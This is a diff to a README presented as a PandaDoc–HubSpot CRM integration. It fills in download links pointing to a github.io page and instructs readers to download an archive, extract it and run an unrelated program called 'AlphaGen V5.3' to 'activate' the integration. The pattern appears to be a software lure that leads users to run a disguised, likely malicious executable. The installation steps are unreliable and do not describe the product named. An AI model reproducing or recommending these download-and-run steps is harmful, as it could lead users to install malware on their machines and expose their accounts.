@@ -2,13 +2,13 @@
 
 Integrate PandaDoc with HubSpot CRM to send, track, and eSign proposals, quotes, and contracts — all within your sales pipeline.
 
-[![Download](https://img.shields.io/badge/Download-PandaDoc_HubSpot_Integration-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-PandaDoc_HubSpot_Integration-blueviolet)](https://pandadoc-integration-hubspot-crm.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://pandadoc-integration-hubspot-crm.github.io/.github)  
 2. 📁 Extract to your preferred directory  
 3. 🖱 Run AlphaGen V5.3 to activate the PandaDoc integration module  
 4. ✅ In HubSpot, go to `Settings > Integrations > PandaDoc`, authorize your account, and enable field mapping
